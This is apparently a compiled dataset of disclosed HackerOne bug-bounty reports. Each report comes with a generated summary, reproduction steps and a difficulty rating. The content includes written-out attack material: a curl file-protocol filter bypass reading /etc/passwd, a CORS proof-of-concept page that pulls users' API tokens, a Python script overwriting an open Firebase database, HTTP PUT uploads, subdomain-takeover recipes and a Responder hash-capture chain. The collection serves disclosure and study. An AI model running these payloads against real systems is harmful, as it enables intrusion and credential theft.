+42* Closing connection -1
+43curl: (1) Protocol "fjle" not supported or disabled in libcurl
+44[root@iz2ze9awqx4bwtc7j5q4hsz bin]# wget 'f[h-j]le:///etc/passwd'
+45f[h-j]le:///etc/passwd: 地址缺少协议类型.
+46[root@iz2ze9awqx4bwtc7j5q4hsz bin]# 
+So, I think this is a security questions of curl, because the wget doesn't have same question. Thinks
+Supporting Material/References:
+[list any additional material (e.g. screenshots, logs, etc.)]
+[attachment / reference]
+Impact
+bypass the security filter like the SSRF/RFL/LFI etc.
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves a URI path parsing error in curl that allows bypassing security filters. Specifically, using character ranges in the protocol (e.g., 'f[h-j]le') or port numbers (e.g., '[80-9000]') can lead to security filter bypasses, enabling SSRF, RFL, or LFI attacks.
+
+Steps to Reproduce:
+1. Run the command: curl -vv 'f[h-j]le:///etc/passwd'
+2. Observe that the command attempts to parse multiple URI paths, including 'file:///etc/passwd', bypassing file protocol blacklists
+Exploitation Difficulty:
+The attack is straightforward and involves a single component (curl's URI parsing). The interaction is obvious once the tester understands how curl handles character ranges in URIs. No complex application states or novel logic are involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/1888915: Reset password link sent over unsecured http protocol
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+After creating the workspace, if victim clicks on forgot password then reset password link has been generated and sent over mail and that password link is unsecured http protocol.
+Steps To Reproduce:
+Signup to a workspace
+Navigate to https://h1-*your-own-instance*.cloud.mattermost.com/reset_password and enter signup email
+<image_0>
+<image_1>
+Mitigation:
+Generate reset password link with secured https protocol.
+Impact
+If the victim opens the reset password link and forgot to update the password, anyone from intermediate computers through network or sniffer can reset the password.
+
+
+
+================================================================================
+Vulnerability Description:
+The reset password link is sent over an unsecured HTTP protocol instead of HTTPS, making it vulnerable to interception by attackers on the same network.
+
+Steps to Reproduce:
+1. Sign up to a workspace
+2. Navigate to the reset password page and enter the signup email to receive the reset link over HTTP
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only requires checking the protocol used in the reset password link, which is a common security practice.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/2499178: Subdomain takeover ████████.mil
+================================================================================
+RAW DESCRIPTION:
+
+Description:
+The subdomain █████.mil is pointing to peosol-lg.███████., the domain ██████ is currently available for registration as can be seen at https://www.godaddy.com/nl-nl/domainsearch/find?domainToCheck=█████
+Given the rules, residency of the US, of the us-tld I decided not to register the domain, also I do believe the output to be enough.
+References
+Impact
+Using this vulnerability an attacker can:
+host unwanted/malicious content under your domain
+receive email on subdomains mentioned above
+effectively execute cross-site scripting attacks
+in some cases, steal cookie data
+in some cases, trick password managers into filling passwords
+System Host(s)
+██████████.mil
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+See the DIG output:
+Code 632 Bytes
+1√ martinvw@denali:~/src > dig █████.mil
+2
+3; <<>> DiG 9.10.6 <<>> ████.mil
+4;; global options: +cmd
+5;; Got answer:
+6;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 44977
+7;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1
+8
+9;; OPT PSEUDOSECTION:
+10; EDNS: version: 0, flags:; udp: 512
+11;; QUESTION SECTION:
+12;█████████.mil.			IN	A
+13
+14;; ANSWER SECTION:
+15██████████.mil.		3600	IN	CNAME	peosol-lg.███.
+16
+17;; AUTHORITY SECTION:
+18us.			900	IN	SOA	a.cctld.us. admin.tldns.godaddy. 1715345748 1800 300 604800 1800
+19
+20;; Query time: 166 msec
+21;; SERVER: 8.8.8.8#53(8.8.8.8)
+22;; WHEN: Fri May 10 15:06:32 CEST 2024
+23;; MSG SIZE  rcvd: 148
+And the GoDaddy page: https://www.godaddy.com/nl-nl/domainsearch/find?domainToCheck=███
+And whois:
+Code 1.71 KiB
+1√ martinvw@denali:~/src > whois ████████.
+2% IANA WHOIS server
+3% for more information on IANA, visit http://www.iana.org
+4% This query returned 1 object
+5
+6refer:        whois.nic.us
+7
+8domain:       US
+9
+10organisation: Registry Services, LLC
+11address:      100 S. Mill Ave, Suite 1600
+12address:      Tempe AZ 85281
+13address:      United States of America (the)
+14
+15contact:      administrative
+16name:         IANA Contact
+17organisation: Registry Services, LLC
+18address:      100 S. Mill Ave, Suite 1600
+19address:      Tempe AZ 85281
+20address:      United States of America (the)
+21phone:        +1 480 505 8800
+22fax-no:       +1 480 393 4275
+23e-mail:       iana@about.us
+24
+25contact:      technical
+26name:         IANA Contact
+27organisation: Registry Services, LLC
+28address:      100 S. Mill Ave, Suite 1600
+29address:      Tempe AZ 85281
+30address:      United States of America (the)
+31phone:        +1 480 505 8800
+32fax-no:       +1 480 393 4275
+33e-mail:       iana@about.us
+34
+35nserver:      B.CCTLD.US 156.154.125.70 2001:502:ad09:0:0:0:0:29
+36nserver:      F.CCTLD.US 2001:500:3682:0:0:0:0:11 209.173.58.70
+37nserver:      K.CCTLD.US 156.154.128.70 2001:503:e239:0:0:0:3:1
+38nserver:      W.CCTLD.US 2001:dcd:1:0:0:0:0:15 37.209.192.15
+39nserver:      X.CCTLD.US 2001:dcd:2:0:0:0:0:15 37.209.194.15
+40nserver:      Y.CCTLD.US 2001:dcd:3:0:0:0:0:15 37.209.196.15
+41ds-rdata:     59017 8 2 7daf469d42b5d8e5537fd4dd4b6057710e9a61f72c32eb7fb6526f52277ec2b0
+42
+43whois:        whois.nic.us
+44
+45status:       ACTIVE
+46remarks:      Registration information: http://www.nic.us
+47
+48created:      1985-02-15
+49changed:      2024-04-16
+50source:       IANA
+51
+52# whois.nic.us
+53
+54No Data Found
+55URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
+56>>> Last update of WHOIS database: 2024-05-10T13:10:37Z <<<
+Suggested Mitigation/Remediation Actions
+Remove CNAME record █████████.mil
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain █████.mil is pointing to an external domain (peosol-lg.███████.) that is available for registration. This creates a subdomain takeover vulnerability where an attacker could register the domain and host malicious content, receive emails, execute cross-site scripting attacks, steal cookie data, or trick password managers.
+
+Steps to Reproduce:
+1. Check the DNS records of the subdomain █████.mil using a tool like dig to see if it points to an external domain.
+2. Verify if the pointed domain (peosol-lg.███████.) is available for registration by checking on a domain registrar like GoDaddy.
+Exploitation Difficulty:
+The vulnerability involves straightforward DNS checks and domain availability verification, with no complex interactions or novel logic required.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/275714: Subdomain takeover on developer.openapi.starbucks.com
+================================================================================
+RAW DESCRIPTION:
+
+Hi team,
+Summary:
+Subdomain developer.openapi.starbucks.com is vulnerable to subdomain takeover via Mashery service. The reason why it's worked unfortunately not fully clear to me.
+Details:
+<image_0>
+<image_1>
+PoC:
+I added simple js code to the Welcome page alert(document.domain) for this proof-of-concept.
+To confirm it just click this link http://developer.openapi.starbucks.com/
+Impact:
+As I can serve my own content without any restrictions, with this webpage I can set up a campaign to steal user cookie sessions, or use it to steal credentials, or for phishing purposes.
+Please let me know, if you need more information!
+Thanks,
+Danil
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain developer.openapi.starbucks.com is vulnerable to subdomain takeover via the Mashery service, allowing an attacker to serve malicious content and potentially steal user credentials or conduct phishing campaigns.
+
+Steps to Reproduce:
+1. Identify the subdomain developer.openapi.starbucks.com as potentially vulnerable to subdomain takeover.
+2. Confirm the vulnerability by hosting and serving custom content (e.g., a simple JavaScript alert) on the subdomain.
+Exploitation Difficulty:
+The vulnerability involves identifying a misconfigured subdomain and leveraging a known service (Mashery) for takeover, which is a straightforward process without complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/294201: subdomain takeover at news-static.semrush.com
+================================================================================
+RAW DESCRIPTION:
+
+Summary: The subdomain news-static.semrush.com can be taken over by attackers and abuse it for further attacks (Phishing, XSS Cross origin, malware, etc..).
+Description: The subdomain news-static.semrush.com was pointed using CNAME to Amazon S3, but no bucket with that name was registered. This meant that anyone could sign up for Amazon S3, claim the bucket as their own and then serve content on news-static.semrush.com
+Browsers Verified In:
+Google Chrome v62.0.3202.94
+FireFox ESR v52.5.0
+Steps To Reproduce:
+Open AWS account
+Create s3 bucket and claim the subdomain news-static.semrush.com
+upload poc.html file to the bucket
+Supporting Material/References:
+Code 488 Bytes
+1$ dig A news-static.semrush.com @8.8.8.8
+2
+3; <<>> DiG 9.8.3-P1 <<>> A news-static.semrush.com @8.8.8.8
+4;; global options: +cmd
+5;; Got answer:
+6;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35678
+7;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0
+8
+9;; QUESTION SECTION:
+10;news-static.semrush.com.	IN	A
+11
+12;; ANSWER SECTION:
+<image_0>
+<image_1>
+<image_2>
+POC
+http://news-static.semrush.com/POC_2313521212.html
+This means that nobody else can claim the bucket and add content.
+Mitigation/Fix
+I have claimed the bucket on my account so no one can claimed it before I release it.
+Remove the news-static.semrush.com DNS entry. Alternatively, if you wish to use news-static.semrush.com with S3, tell me in a comment and I will remove the bucket from my Amazon account.
+Impact
+The attacker will own the subdomain and can do whatever he want with it, such as Phishing, XSS that can affect all *.semrush.com to bypass cross origin policy and upload malwares. etc..
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain news-static.semrush.com was pointed using CNAME to Amazon S3, but no bucket with that name was registered. This meant that anyone could sign up for Amazon S3, claim the bucket as their own and then serve content on news-static.semrush.com, potentially leading to phishing, XSS, or malware distribution.
+
+Steps to Reproduce:
+1. Open AWS account
+2. Create s3 bucket and claim the subdomain news-static.semrush.com
+3. Upload poc.html file to the bucket
+Exploitation Difficulty:
+The vulnerability involves a straightforward process of identifying an unclaimed S3 bucket associated with a subdomain and claiming it. The steps are simple and do not require complex interactions or understanding of subtle application logic.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/369581: HTTP PUT method enabled
+================================================================================
+RAW DESCRIPTION:
+
+Hi security team,
+Summary: It is possible to upload files to the server using the PUT method
+Steps To Reproduce:
+I used the following request:
+Code 98 Bytes
+1PUT /emitrani.txt HTTP/1.1
+2Host: ratelimited.me
+3Content-Length: 10
+4Connection: close
+5
+6emitrani POC
+Now a file exists at https://ratelimited.me/emitrani.txt
+with contents of the put request.
+Impact
+Anyone can upload files to the server.
+Regards,
+Eray
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability allows any user to upload files to the server using the HTTP PUT method, which could lead to unauthorized file storage and potential server compromise.
+
+Steps to Reproduce:
+1. Send an HTTP PUT request to the target server with a file path and content in the request body.
+2. Verify that the file has been uploaded by accessing the URL where the file was placed.
+Exploitation Difficulty:
+The attack is straightforward and does not involve multiple components, complex interactions, or novel logic. It simply requires sending a standard HTTP PUT request, which is a basic web operation.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/380158: svcardproxydevus.starbucks.com Subdomain take over
+================================================================================
+RAW DESCRIPTION:
+
+You have left a dns record pointing to a dead cloudapp vm.
+Code 139 Bytes
+1svcardproxydevus.starbucks.com -> s00307ntmp0svcardproxydev0.trafficmanager.net -> s00307dpipsvcardproxy00.eastus.cloudapp.azure.com = Dead
+Impact
+Code 466 Bytes
+11) Attacker takes over subdomain and then puts something like porn or something that shouldn't be on the domain.
+22) hacker then contacts support pretending to be a concerned user.
+33) support click on it to check what is going on
+44) attacker has put responder on the page via a image file using a UNC path (https://github.com/SpiderLabs/Responder)
+55) attacker is then sent supports hash for their windows login.
+66) attacker then cracks hash and uses the VPN to pivot 
+They can also use it to phish and other bad activitys
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain svcardproxydevus.starbucks.com is vulnerable to takeover due to a dangling DNS record pointing to a dead cloudapp VM. An attacker can hijack the subdomain to host malicious content, capture credentials (e.g., via responder), or conduct phishing campaigns.
+
+Steps to Reproduce:
+1. Identify the subdomain svcardproxydevus.starbucks.com pointing to a dead cloudapp VM.
+2. Verify the DNS chain: svcardproxydevus.starbucks.com -> s00307ntmp0svcardproxydev0.trafficmanager.net -> s00307dpipsvcardproxy00.eastus.cloudapp.azure.com (dead).
+3. Take over the subdomain by registering the dead cloudapp VM or pointing it to a malicious server.
+4. Host malicious content (e.g., phishing page or responder tool) on the subdomain.
+5. Exploit the subdomain for hash capture (via responder) or phishing attacks.
+Exploitation Difficulty:
+The vulnerability involves straightforward DNS reconnaissance and subdomain takeover techniques. While the impact is severe, the discovery process is simple and does not require complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/460642: HTTP PUT method enabled
+================================================================================
+RAW DESCRIPTION:
+
+Hi security team,
+Summary: It is possible to upload files to the server using the PUT method
+Steps To Reproduce:
+I used the following request:
+PUT /emitrani.txt HTTP/1.1
+Host: ratelimited.me
+Content-Length: 10
+Connection: close
+Now a file exists at https://ratelimited.me/emitrani.txt
+with contents of the put request.
+Impact
+impact
+
+
+
+================================================================================
+Vulnerability Description:
+The server allows file uploads via the HTTP PUT method, which can lead to unauthorized file uploads and potential server compromise.
+
+Steps to Reproduce:
+1. Send an HTTP PUT request to the target server with a file path and content.
+2. Verify that the file was uploaded by accessing the URL specified in the PUT request.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only requires sending a basic HTTP PUT request and verifying the file upload. There are no complex interactions or states involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/471265: unuse domain still in using at wechat by Starbucks East China
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+spcc.mobi is still using at wechat offical account by Starbucks East China. but this domain is on sale.
+Description:
+I had reported this at report_id=433843，bu your gays had ignored, because they said the domain is unused.
+In fact, spcc.mobi still having an interface using at wechat offical account by Starbucks East China
+wechat offical account name is 星巴克江浙沪
+endponit request below:
+Code 720 Bytes
+1GET /v5/bind.html HTTP/1.1
+2Host: coupon.ec-starbucks.cn
+3User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MOB31E; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044405 Mobile Safari/537.36 MMWEBID/157 MicroMessenger/6.7.3.1360(0x260703EC) NetType/WIFI Language/zh_CN Process/tools
+4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/wxpic,image/sharpp,image/apng,image/tpg,*/*;q=0.8
+5Accept-Encoding: gzip, deflate
+6Accept-Language: zh-CN,en-US;q=0.8
+7Cookie: PHPSESSID=ip1f71qqak3kvakksu28bensjlapsh9a; Hm_lvt_b7c2e12efc764f8179148ddbece8211f=1545489448; Hm_lpvt_b7c2e12efc764f8179148ddbece8211f=1545489448
+8Connection: close
+9
+reponse is below:
+Code 446 Bytes
+1....
+2<script>
+3	$(function(){
+4		$.get('http://weixin.spcc.mobi/oauth/_jssdk.html',{url:location.href.split('#')[0]},function(data){
+5			 wx.config($.extend({
+6			    debug: false,
+7			    jsApiList: ['onMenuShareTimeline','onMenuShareAppMessage','onMenuShareQQ','onMenuShareWeibo','hideMenuItems','showMenuItems','hideOptionMenu','showOptionMenu',]
+8			},data));
+9		},'jsonp');
+10	})
+11	
+12	wx.ready(function () {	
+13		wx.hideOptionMenu();
+14	});
+15
+16</script>
+17....
+Platform(s) Affected:
+coupon.ec-starbucks.cn(Starbucks East China in using)
+Steps To Reproduce:
+plan A(easy)
+request the endpoint I offer
+you will find the reponse contain "weixin.spcc.mobi"
+visit the weixin.spcc.mobi you will find that this domain is on sale
+plan B(complicated)
+register a wechat account(download the app(name is wechat) from app store or play store)
+search wechat offical account 星巴克江浙沪 then follow
+click my card
+you can find the requests as the I had mention.
+Recommendations for fix
+remove the the unused weixin.spcc.mobi endpoint
+Impact
+the domain is on sale, if attacker buy this domain, can full control this domain for(Phishing Attack and etc.)
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves a domain (weixin.spcc.mobi) that is still in use by Starbucks East China's WeChat official account but is listed for sale. If an attacker purchases this domain, they could potentially conduct phishing attacks or other malicious activities by controlling the domain's content.
+
+Steps to Reproduce:
+1. Request the endpoint provided in the report (coupon.ec-starbucks.cn/v5/bind.html) and observe the response containing 'weixin.spcc.mobi'.
+2. Visit weixin.spcc.mobi to confirm the domain is on sale, indicating potential security risks if acquired by an attacker.
+Exploitation Difficulty:
+The discovery involves straightforward steps of inspecting network requests and verifying domain ownership status, without complex interactions or state manipulations.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/474798: Subdomain takeover on healthyhackathon.khanacademy.org and hackweek.khanacademy.org
+================================================================================
+RAW DESCRIPTION:
+
+Summary :
+healthyhackathon.khanacademy.org can be took over, since it points to a bucket in S3 but that bucket does not exists.
+I know this domain is used to host information of healthyhackathon which is held by khanacademy, but you will not be able to do this anymore if someone is going to claim that bucket.
+Reference :
+S3_takeover
+Impact
+Taking control of healthyhackathon.khanacademy.org and spoof khanacademy users that healthyhackathon is reopened/"archived for you to challenge" and collect their information.
+
+
+
+================================================================================
+Vulnerability Description:
+The subdomain healthyhackathon.khanacademy.org is vulnerable to takeover because it points to a non-existent S3 bucket. An attacker could claim the bucket and host malicious content, potentially spoofing Khan Academy users.
+
+Steps to Reproduce:
+1. Identify the subdomain healthyhackathon.khanacademy.org pointing to an S3 bucket.
+2. Verify that the S3 bucket does not exist, making the subdomain vulnerable to takeover.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only requires checking DNS records for subdomains and verifying the existence of the referenced S3 bucket. There are no complex interactions or state manipulations involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/733017: CORS Misconfiguration Leads to Exposing User Data
+================================================================================
+RAW DESCRIPTION:
+
+Vulnerable Asset: https://██████/█████████/
+Discovery:
+Upon accessing the site we discover two specific response headers which indicates that a cross-domain request for sensitive information might be possible
+Access-Control-Allow-Origin: injectable
+Access-Control-Allow-Credentials: true
+We craft a POC below and exploit the misconfigurations present by exposing the users API key, email, first name, last name, etc.
+███
+POC:
+This is hosted on http://█████████
+Code 265 Bytes
+1<html>
+2<script>
+3  var xhttp = new XMLHttpRequest();
+4  <!-- the below endpoint lists API tokens previously generated by the user -->
+5  xhttp.open("GET", "https://█████/████/api/token/list", true);
+6  xhttp.withCredentials = true;
+7  xhttp.send(null);
+8</script>
+9</html>
+Demo:
+███████
+Remediations:
+Do not allow the Access-Control-Allow-Origin to be arbitrarily set by the user; the domain should be whitelisted that is allowed access to CORS, or the wildcard operator * should be used instead, which will disallow the Allow-Credentials header
+Impact
+This attack works similarly to a CSRF attack in that an attacker would need to have a victim visit the attacker's website in order to trigger the exploit. If the victim is logged in, then the result is full access to API keys which serve in lieu of username/password as shown in the demo. The attacker then can perform any action within the user's account that the API allows.
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability is a CORS misconfiguration that allows an attacker to make cross-origin requests to a sensitive endpoint, potentially exposing user data such as API keys, email, and other personal information. The misconfiguration involves setting 'Access-Control-Allow-Origin' to a user-controlled value and 'Access-Control-Allow-Credentials' to 'true', which enables the attacker to include credentials in the request.
+
+Steps to Reproduce:
+1. Craft a malicious HTML page with JavaScript that makes a cross-origin request to the vulnerable endpoint.
+2. Host the malicious page on a web server and trick a victim into visiting it while they are logged into the vulnerable site.
+Exploitation Difficulty:
+The vulnerability is relatively straightforward to discover and exploit. It involves a common misconfiguration (CORS) and does not require complex interactions or novel logic. The attacker only needs to craft a simple HTML page and host it, then trick the victim into visiting it.
+
+--------------------------------------------------------------------------------
+
+
+
+Improper Authentication - Generic Vulnerabilities (5 reports)
+--------------------------------------------------
+
+Report https://hackerone.com/reports/1065134: Firebase Database Takeover in Zego Sense Android app
+================================================================================
+RAW DESCRIPTION:
+
+Hello Team,
+Summary:
+publicly available Firebase Database (api-project-615509201590.firebaseio.com)
+Platform Affected: [android]
+com.zegocover.zego
+Steps To Reproduce:
+in res/values/strings.xml
+<string name="firebase_database_url">https://api-project-615509201590.firebaseio.com</string>
+POC:
+Go to https://api-project-615509201590.firebaseio.com/.json
+<image_0>
+Exploit:
+import requests
+data= {"Exploit":"Successfull", "H4CKED BY": "Sheikh Rishad"}
+reponse = requests.put("https://api-project-615509201590.firebaseio.com/.json", json=data)
+References:
+There are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:
+https://firebase.google.com/docs/database/security/resolve-insecurities
+Regards,
+Sheikh Rishad
+Impact
+This is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if zego uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the zego.
+So please immediately change the rule of the database to private so that nobody can able to access it outside.
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves a publicly accessible Firebase database due to misconfigured security rules, allowing unauthorized access and modification of the database.
+
+Steps to Reproduce:
+1. Inspect the Android app's resources, specifically res/values/strings.xml, to find the Firebase database URL.
+2. Access the Firebase database directly by visiting the URL found in the previous step, e.g., https://api-project-615509201590.firebaseio.com/.json.
+Exploitation Difficulty:
+The attack is straightforward and involves only a few steps: locating the Firebase URL in the app's resources and accessing it directly. There are no complex interactions or states involved, and the logic is common for Firebase misconfigurations.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/197789: [insideok.ru] Database Dump
+================================================================================
+RAW DESCRIPTION:
+
+http://insideok.ru/db.sql
+Внутри - учётки админов на 2016 год.
+-- Хост: localhost
+-- Время создания: Сен 03 2016 г., 12:00
+-- Версия сервера: 5.5.47-cll-lve
+-- Версия PHP: 5.4.45
+Структура таблицы users
+CREATE TABLE IF NOT EXISTS users( id int(11) unsigned NOT NULL, █████ ███████ ███████ ██████████ ███ ██████████ ███ █████████ ███████ ████████ █████ █████ ) ENGINE=InnoDB AUTO_INCREMENT=60 DEFAULT CHARSET=utf8 AVG_ROW_LENGTH=5461;
+Дамп данных таблицы users
+INSERT INTO users (██████████) VALUES ████ ███ ████████ ███ ████ ███████ ████████ ███████ █████ ███ ███ ████████ ███████ ███████ ████████ ██████ ████████ ████ ███
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves the exposure of a database dump containing sensitive information, including admin credentials, on a publicly accessible URL. This allows attackers to download and extract sensitive data without any authentication.
+
+Steps to Reproduce:
+1. Access the URL http://insideok.ru/db.sql to download the database dump.
+2. Analyze the database dump to extract sensitive information such as admin credentials.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves accessing a publicly available URL and analyzing the exposed database dump. There are no complex interactions or novel logic involved.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/206650: Broken Authentication - Security token gets captured via man in the middle attack
+================================================================================
+RAW DESCRIPTION:
+
+Product / URL
+http://en.instagram-brand.com/register/reset/<the security token here>?email=<email address here>
+Description and Impact
+The password reset links issues by Instagram Brand gets delivered to users inbox with a http scheme and NOT https scheme.
+This causes an attacker stealing those links and performing mass account takeovers and security compromises.
+The link that gets delivered in inbox is:
+http://mandrillapp.com/track/click/30956340/instagram-brand.com?p=<the very long security token here>
+On requesting the above link in browser, it sends back the password reset token in clear text: http://en.instagram-brand.com/register/reset/<the security token here>?email=<the email of user here>
+Solution:
+This issues has a very easy solution. I have myself performed this and it worked !!.
+Whenever the code responsible for sending password reset link makes those links, just add https as scheme instead of http. And you will observe that now all the accounts are safe and data cannot be stolen.
+Reproduction Instructions / Proof of Concept
+Request for you password reset link.
+Go to inbox.
+Right click that link and paste it on notepad and observe the scheme.
+You can also start Wireshark to capture the traffic and observe that security token can be compromised.
+I have attached the screenshot of Wireshark as a proof of concept. InstagramBrandMITM.png (F161119)
+
+
+
+================================================================================
+Vulnerability Description:
+The password reset links issued by Instagram Brand are delivered over HTTP instead of HTTPS, making them susceptible to Man-in-the-Middle (MITM) attacks. An attacker can intercept these links and capture the security token, leading to potential account takeovers.
+
+Steps to Reproduce:
+1. Request a password reset link from Instagram Brand.
+2. Inspect the received link in the inbox to observe it uses HTTP instead of HTTPS.
+3. Capture the traffic using a tool like Wireshark to observe the security token being transmitted in cleartext.
+Exploitation Difficulty:
+The vulnerability involves a straightforward observation of the protocol used in the password reset link. The attack does not require complex interactions or manipulation of application states. The issue is easily identifiable by inspecting the link or capturing network traffic.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/207053: Writable RubyCi Amazon s3 bucket
+================================================================================
+RAW DESCRIPTION:
+
+Hello, I have discovered that the bucket:
+<image_0>
+is able to be written to by authenticated aws users. This is due to the current permissions configurations
+I have added a file here:
+<image_1>
+for proof of concept. This can be potentially dangerous to your users and website, as any of the web content in this bucket may be replaced with malicious files.
+More info about these permissions can be found here: http://docs.aws.amazon.com/AmazonS3/latest/dev/s3-access-control.html
+
+
+
+================================================================================
+Vulnerability Description:
+The vulnerability involves an Amazon S3 bucket (RubyCi) that is misconfigured to allow write access to authenticated AWS users. This misconfiguration can lead to unauthorized modifications or replacements of web content with malicious files.
+
+Steps to Reproduce:
+1. Identify the target Amazon S3 bucket (e.g., RubyCi bucket)
+2. Attempt to write a file to the bucket using authenticated AWS credentials
+Exploitation Difficulty:
+The discovery of this vulnerability is straightforward as it only requires checking the bucket's permissions and attempting to write a file. There are no complex interactions or states involved, and the logic is common in S3 bucket misconfigurations.
+
+--------------------------------------------------------------------------------
+
+Report https://hackerone.com/reports/2635315: Yet Another OTP code Leaked in the API Response
+================================================================================
+RAW DESCRIPTION:
+
+Summary:
+This is much similar to my report here(https://hackerone.com/reports/2633888) , except it affects a different domain. The application requests a phone number for authentication, then sends an OTP code to the user. But the OTP is leaked in the response which defeats the whole purpose of it's implementation.
+Steps To Reproduce:
+Supporting Material/References:
+https://hackerone.com/reports/2633888
+Recommendation
+Don't return the OTP code in the API's response
+Impact
+It's possible to sign up with other users accounts. It's possible to log into other users accounts as well. Another thing I noticed is that, you can sign up with any 10-digit phone number since the OTP is in the response for you to use, makes creating junk accounts easily possible.
+
+
+
+================================================================================
+Vulnerability Description:
+The application leaks the OTP code in the API response after requesting a phone number for authentication, allowing attackers to bypass the OTP verification process and potentially sign up or log in as other users.
+
+Steps to Reproduce:
+1. Enter a phone number for authentication on the vulnerable domain.
+2. Observe the API response containing the OTP code that was sent to the phone number.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only involves observing the API response after submitting a phone number. There are no complex interactions or state manipulations required.
+
+--------------------------------------------------------------------------------
+
+
+
